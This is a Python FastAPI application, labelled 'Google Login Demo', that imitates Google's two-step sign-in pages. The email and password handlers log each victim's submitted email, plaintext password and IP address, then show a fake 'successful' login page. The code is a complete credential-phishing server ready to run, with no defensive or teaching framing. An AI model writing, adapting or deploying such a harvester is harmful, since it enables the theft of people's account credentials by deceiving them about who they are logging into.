from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
import logging
from datetime import datetime
import uvicorn
from typing import Optional

# Настраиваем логирование
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="Google Login Demo")
templates = Jinja2Templates(directory="templates")

# Временное хранилище email между шагами
temp_storage = {}

@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    """Первый шаг: ввод email"""
    return templates.TemplateResponse("email_step.html", {"request": request})

@app.post("/verify-email")
async def verify_email(request: Request, email: str = Form(...)):
    """Проверка email и переход к паролю"""
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_host = request.client.host if request.client else "N/A"
    
    # Логируем email
    log_message = f"[{current_time}] Paso 1 - Email recibido. IP: {client_host}, Email: '{email}'"
    logger.info(log_message)
    
    # Сохраняем email для второго шага
    temp_storage[client_host] = email
    
    # Перенаправляем на страницу пароля
    response = RedirectResponse(url="/password", status_code=303)
    response.set_cookie(key="temp_email", value=email)
    return response

@app.get("/password", response_class=HTMLResponse)
async def password_page(request: Request):
    """Второй шаг: ввод пароля"""
    email = request.cookies.get("temp_email", "")
    return templates.TemplateResponse("password_step.html", {
        "request": request,
        "email": email
    })

@app.post("/verify-password")
async def verify_password(request: Request, password: str = Form(...)):
    """Обработка пароля"""
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_host = request.client.host if request.client else "N/A"
    
    # Получаем email из куки
    email = request.cookies.get("temp_email", "Desconocido")
    
    # Логируем пароль
    log_message = f"[{current_time}] Paso 2 - Contraseña recibida. IP: {client_host}, Email: '{email}', Password: '{password}'"
    logger.info(log_message)
    
    # Перенаправляем "успешный" вход
    return templates.TemplateResponse("success.html", {
        "request": request,
        "email": email
    })

# Запуск приложения
if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)